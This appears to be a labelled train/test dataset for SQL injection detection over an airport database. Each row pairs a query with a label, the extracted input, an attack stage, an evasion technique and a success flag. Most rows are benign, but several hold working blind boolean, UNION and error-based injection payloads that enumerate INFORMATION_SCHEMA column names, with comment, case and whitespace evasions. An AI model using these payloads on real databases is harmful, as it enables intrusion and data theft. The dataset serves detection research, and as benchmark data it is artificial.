"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CL""  AND  8717=( SELECT   (   CASE     WHEN  (  ORD(    MID(( SELECT     IFNULL(  CAST( column_name      AS   NCHAR  ),0x20)    FROM    INFORMATION_SCHEMA.   COLUMNS        WHERE      table_name  =0x6e617661696473  AND  table_schema=0x64617461736574    LIMIT    14,1),5,1))>101)  THEN   8717  ELSE   ( SELECT   6030  UNION     SELECT   5305)    END    ))-- -""",1," CL   AND  8717=( SELECT   (   CASE     WHEN  (  ORD(    MID(( SELECT     IFNULL(  CAST( column_name      AS   NCHAR  ),0x20)    FROM    INFORMATION_SCHEMA.   COLUMNS        WHERE      table_name  =0x6e617661696473  AND  table_schema=0x64617461736574    LIMIT    14,1),5,1))>101)  THEN   8717  ELSE   ( SELECT   6030  UNION     SELECT   5305)    END    ))-- - ",exploit,multiplespaces,success,select,airport-S9,boolean-204,boolean,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SDD6"",""small_airport"", ""-1927     UNION     ALL       SELECT   4373,4373,4373,4373,4373,4373,4373,4373#"",""https://en.wikipedia.org/wiki/King_Island_Airport"",""AS"")",1," SDD6 small_airport -1927     UNION     ALL       SELECT   4373,4373,4373,4373,4373,4373,4373,4373# https://en.wikipedia.org/wiki/King_Island_Airport AS ",recon,multiplespaces,failure,insert,airport-I3,union-14,union,test
"DELETE FROM airport WHERE name LIKE ""Mendig Airfield"" OR keywords LIKE ""Hahaia"";  ",0,Mendig Airfield Hahaia,,,,delete,airport-D3,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""BR-MT""",0,AS BR-MT,,,,select,airport-S8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Hackley Hospital Emergency Heliport""",0,Hackley Hospital Emergency Heliport,,,,select,airport-S3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 127.45 AND  119.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  127.7  AND  132.3  ORDER BY frequency;",0,127.45 119.3 127.7 132.3,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SJCM"") OR name LIKE ""Seacloud Hotel, Hotel Seacloud""",0,"SJCM Seacloud Hotel, Hotel Seacloud",,,,select,airport-S10,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Paniai"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Sikasso Region"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Perú"", ""%"");",0,Paniai Airports in Sikasso Region Aeropuertos de Perú,,,,select,airport-S18,,,test
"DELETE FROM airport WHERE ident=""35AK"";",0,35AK,,,,delete,airport-D1,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""CA""",0,CA,,,,select,airport-S6,,,test
"DELETE FROM countries WHERE code = ""CD"";",0,CD,,,,delete,airport-D7,,,test
"INSERT INTO countries (code, name, continent) VALUES (""KW"", ""São Tomé and Principe"", ""AF"")",0,KW São Tomé and Principe AF,,,,insert,airport-I7,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 1207=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1),9,1))>84) then 1207 else (select 4520 union select 4098) end))-- -""",1," Jindal Heliport  and 1207=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1),9,1))>84) then 1207 else (select 4520 union select 4098) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"INSERT INTO countries (code, name, continent) VALUES (""CY"", ""Palau"", ""EU"")",0,CY Palau EU,,,,insert,airport-I7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""KI"" GROUP BY r.name ORDER BY r.name ASC;",0,KI,,,,select,airport-S5,,,train
"UPDATE airport SET wikipedia_link = ""https://pl.wikipedia.org/wiki/Aeroklub_Bydgoski"" WHERE ident = ""MX-1628""",0,https://pl.wikipedia.org/wiki/Aeroklub_Bydgoski MX-1628,,,,update,airport-U3,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SVKV"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WI40"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Brindisi Papola Casale Airport, Brindisi Salento Airport, Brindisi Casale Antonio Papolo Airport, Salento Airport"", ""%"");",0,"SVKV WI40 Brindisi Papola Casale Airport, Brindisi Salento Airport, Brindisi Casale Antonio Papolo Airport, Salento Airport",,,,select,airport-S17,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""UKLU"";",0,UKLU,,,,select,airport-S7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BG"" GROUP BY r.name ORDER BY r.name ASC;",0,BG,,,,select,airport-S5,,,test
"DELETE FROM regions WHERE name = ""Montevideo Department"";",0,Montevideo Department,,,,delete,airport-D8,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Orson Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Orson Field,,,,select,airport-S14,,,test
"UPDATE airport SET name = ""Yaizu Heliport"" WHERE ident = ""CYFB""",0,Yaizu Heliport CYFB,,,,update,airport-U1,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""US-7452"")) as BcjN where 6425=6425 and 3533=5134-- -"", ""small_airport"", ""REC Berrini Helipad"", -5.833000183105469, -57.041631, 2625.0)",1," US-7452""   as BcjN where 6425=6425 and 3533=5134-- - small_airport REC Berrini Helipad -5.833000183105469 -57.041631 2625.0 ",recon,lowercase,failure,insert,airport-I2,boolean-6,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LT"" GROUP BY r.name ORDER BY r.name ASC;",0,LT,,,,select,airport-S5,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AK10','SDZD','MX-1092','FEFY');",0,AK10 SDZD MX-1092 FEFY,,,,update,airport-U10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SZ"" OR c.name LIKE CONCAT(""%"", ""Bulgaria"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,SZ Bulgaria 2,,,,select,airport-S20,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Hanger ABC Heliport""",0,Hanger ABC Heliport,,,,select,airport-S3,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""GY"" OR c.name LIKE CONCAT(""%"", ""Faroe Islands"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,GY Faroe Islands 3,,,,select,airport-S20,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CO""",0,CO,,,,select,airport-S6,,,test
"DELETE FROM navaids WHERE ident = ""MAU"";",0,MAU,,,,delete,airport-D6,,,test
SHOW TABLES;,0,,,,,admin,airport-admin2,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""GW-GA"", ""U-A"", ""Nuevo León"", ""SA"", ""PK"")",0,GW-GA U-A Nuevo León SA PK,,,,insert,airport-I5,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""RS""",0,RS,,,,select,airport-S6,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ostrobothnia Region"";",0,Ostrobothnia Region,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE gps_code = ""EGTC"" OR local_code = ""CFB8""",0,EGTC CFB8,,,,select,airport-S4,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 13,1),24,1))>101) then 23192 else (select 5363 union select 1032) end)), ""LKMO"", 2290.0, ""ASPH-P"", 1, 0)",1," (select (case when (ord(mid((select ifnull(cast(column_name as nchar ,0x20  from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 13,1 ,24,1  >101  then 23192 else (select 5363 union select 1032  end   LKMO 2290.0 ASPH-P 1 0 ",exploit,lowercase,success,insert,airport-I9,boolean-48,boolean,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""JP-1995"";",0,JP-1995,,,,select,airport-S7,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Fafe heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Fafe heliport,,,,select,airport-S14,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Neff Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Neff Field,,,,select,airport-S14,,,test
"DELETE FROM runways WHERE airport_ident = ""17WI"";",0,17WI,,,,delete,airport-D5,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Alakanuk Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Alakanuk Airport,,,,select,airport-S14,,,test
"INSERT INTO countries (code, name, continent) VALUES (""SY"", ""-1217) OR ELT/**/(1889=1889,3971) AND (5566=5566"", ""AF"")",1," SY -1217) OR ELT/**/(1889=1889,3971) AND (5566=5566 AF ",recon,commentbeforeparentheses,success,insert,airport-I7,boolean-36,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Vencerámica Tejerías  Heliport""",0,Vencerámica Tejerías  Heliport,,,,select,airport-S3,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""ABW, ABW"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Ziri"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""DRC"", ""%"");",0,"ABW, ABW Airports in Ziri DRC",,,,select,airport-S18,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (89450, ""ODR"", ""Al Ain"", ""VOR-DME"", 345, ""US"")",0,89450 ODR Al Ain VOR-DME 345 US,,,,insert,airport-I10,,,test
"UPDATE airport SET name = ""Alaskan RV Park Airstrip"" WHERE ident = ""1U9""",0,Alaskan RV Park Airstrip 1U9,,,,update,airport-U1,,,test
SELECT * FROM airport WHERE icao_code = 'VGJR';,0,VGJR,,,,select,airport-S1,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SJOM"") OR name LIKE ""Polonia International Airport, WIMM""",0,"SJOM Polonia International Airport, WIMM",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VE"" GROUP BY r.name ORDER BY r.name ASC;",0,VE,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE gps_code = ""SIQW"" OR local_code = ""7V9""",0,SIQW 7V9,,,,select,airport-S4,,,test
"DELETE FROM countries WHERE code = ""JE"";",0,JE,,,,delete,airport-D7,,,test
"DELETE FROM regions WHERE name = ""Sancti	SpíritusProvince	ORDER�BY
1---"";",1," Sancti	SpíritusProvince	ORDER�BY
1--- ",recon,space2mysqlblank,failure,delete,airport-D8,union-152,union,test
"UPDATE regions SET keywords = ""Airports in Zambezia Province"" where 9829=9829 and 7835=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 19,1),1,1))>97) then 7835 else (select 6231 union select 9403) end))-- -"" WHERE iso_country = ""LV"";",1," Airports in Zambezia Province"" where 9829=9829 and 7835=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 19,1),1,1))>97) then 7835 else (select 6231 union select 9403) end))-- - LV ",exploit,lowercase,success,update,airport-U9,boolean-102,boolean,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""KE-700""",0,SA KE-700,,,,select,airport-S8,,,test
"DELETE FROM airport WHERE name = ""SCE Energy Control Center Heliport"";  ",0,SCE Energy Control Center Heliport,,,,delete,airport-D2,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (89058, ""MN"", ""Formosa"", ""TACAN"", 412, ""PH"")",0,89058 MN Formosa TACAN 412 PH,,,,insert,airport-I10,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MY"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,MY 3,,,,select,airport-S19,,,test
"DELETE FROM airport WHERE name LIKE ""Winters Helicopter Landing Paddock"" OR keywords LIKE ""SWFW"";  ",0,Winters Helicopter Landing Paddock SWFW,,,,delete,airport-D3,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""RU-0417"";",0,RU-0417,,,,select,airport-S7,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""VE-D"", ""RP"", ""Gorj County"", ""EU"", ""SD"")",0,VE-D RP Gorj County EU SD,,,,insert,airport-I5,,,test
"UPDATE navaids SET name = ""Soroako"" WHERE ident = ""HFF"";",0,Soroako HFF,,,,update,airport-U7,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""RU"", ""Barbados"", ""EU"", ""Aeropuertos de Bolivia"")",0,RU Barbados EU Aeropuertos de Bolivia,,,,insert,airport-I6,,,train
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""10MS, 10MS"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Mozirje"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Île Bourbon, La Réunion"", ""%"");",0,"10MS, 10MS Airports in Mozirje Île Bourbon, La Réunion",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""SPLO"", ""small_airport"", ""RAF Birch"", 35.68177, -85.492938, 1046.0)",0,SPLO small_airport RAF Birch 35.68177 -85.492938 1046.0,,,,insert,airport-I2,,,test
SELECT * FROM airport WHERE icao_code = 'KBED';,0,KBED,,,,select,airport-S1,,,test
"SELECT id FROM airports WHERE name LIKE ""%D3Xh3LriNa1GIF7euQlK%"" AND elevation_feet BETWEEN 561.0 AND 5799.0 AND iso_region LIKE ""US-FL"" AND scheduled_service = ""no"" AND latitude >= 38.393916",0,D3Xh3LriNa1GIF7euQlK 561.0 5799.0 US-FL no 38.393916,,,,select,airport-S23,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""C 504 Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,C 504 Heliport,,,,select,airport-S14,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LS"" GROUP BY r.name ORDER BY r.name ASC;",0,LS,,,,select,airport-S16,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -','MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -','MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -','MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- -');",1," MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - MO7') AND 8156 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 19,1),6,1))>112) THEN 8156 ELSE (SELECT 8914 UNION SELECT 4073) END))-- - ",exploit,equaltolike,success,update,airport-U10,boolean-108,boolean,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""ZA-NP""",0,AS ZA-NP,,,,select,airport-S8,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""RW"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,RW 2,,,,select,airport-S19,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Kremmling Memorial Hospital Heliport"" anD 2915=(seLeCt (CAse whEN (oRd(Mid((seLeCt ifnuLL(CaSt(ColUmN_Name aS nCHar),0x20) FrOM INFORMATION_SCHEMA.cOlumNs wHerE tabLe_NAme=0x72756e77617973 anD table_schema=0x64617461736574 LImit 15,1),6,1))>96) theN 2915 ELse (seLeCt 6058 UNiON seLeCt 8438) eNd))-- -"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",1," Kremmling Memorial Hospital Heliport"" anD 2915=(seLeCt (CAse whEN (oRd(Mid((seLeCt ifnuLL(CaSt(ColUmN_Name aS nCHar),0x20) FrOM INFORMATION_SCHEMA.cOlumNs wHerE tabLe_NAme=0x72756e77617973 anD table_schema=0x64617461736574 LImit 15,1),6,1))>96) theN 2915 ELse (seLeCt 6058 UNiON seLeCt 8438) eNd))-- - ",exploit,randomcase,success,select,airport-S14,boolean-228,boolean,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""24MI"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Andalucía"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Chad"", ""%"");",0,24MI Airports in Andalucía Airports in Chad,,,,select,airport-S18,,,test
"DELETE FROM runways WHERE airport_ident = ""IS80"";",0,IS80,,,,delete,airport-D5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Cuanza Sul Province"";",0,Cuanza Sul Province,,,,select,airport-S15,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(3740,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/14,1),2,1))>96)/**/THEN/**/3740/**/ELSE/**/0x3A/**/END)/**/AND/**/""OXvG""=""OXvG"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(3740,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x72756e77617973/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/14,1),2,1))>96)/**/THEN/**/3740/**/ELSE/**/0x3A/**/END)/**/AND/**/""OXvG""=""OXvG Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT * FROM airport WHERE gps_code = ""96VA"" OR local_code = ""YPSR""",0,96VA YPSR,,,,select,airport-S4,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZZ"" OR c.name LIKE CONCAT(""%"", ""Hungary"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,ZZ Hungary 3,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE gps_code = ""CTU2"" OR local_code = ""ZEF""",0,CTU2 ZEF,,,,select,airport-S4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TH"" GROUP BY r.name ORDER BY r.name ASC;",0,TH,,,,select,airport-S5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""South West Ethiopia Peoples' Region"";",0,South West Ethiopia Peoples' Region,,,,select,airport-S15,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 127.7 AND  120.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.8  AND  118.4  ORDER BY frequency;",0,127.7 120.7 122.8 118.4,,,,select,airport-S13,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Markovo Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Markovo Heliport,,,,select,airport-S14,,,test
"DELETE FROM navaids WHERE ident = ""TMS""))
ASyRtI	WHERE9827=9827;SELECT�(CASEWHEN(8020=3522)THEN8020ELSE8020*(SELECT	8020FROMINFORMATION_SCHEMA.PLUGINS)END)#"";",1," TMS""))
ASyRtI	WHERE9827=9827;SELECT�(CASEWHEN(8020=3522)THEN8020ELSE8020*(SELECT	8020FROMINFORMATION_SCHEMA.PLUGINS)END)# ",recon,space2mysqlblank,failure,delete,airport-D6,boolean-138,boolean,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1549"" AS SIGNED) AND a.iso_country = ""MT"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1549 MT,,,,select,airport-S22,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""AI"" OR c.name LIKE CONCAT(""%"", ""Trinidad and Tobago"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,AI Trinidad and Tobago 5,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""KFDW"", ""small_airport"", ""Beas De Segura Airfield"", 33.60211, -122.20654428)",0,KFDW small_airport Beas De Segura Airfield 33.60211 -122.20654428,,,,insert,airport-I1,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VN"" GROUP BY r.name ORDER BY r.name ASC;",0,VN,,,,select,airport-S5,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 833.0",0,US 833.0,,,,select,airport-S11,,,test
"UPDATE airport_frequencies SET frequency_mhz = 121.73 WHERE type = ""A/D"";",0,121.73 A/D,,,,update,airport-U6,,,test
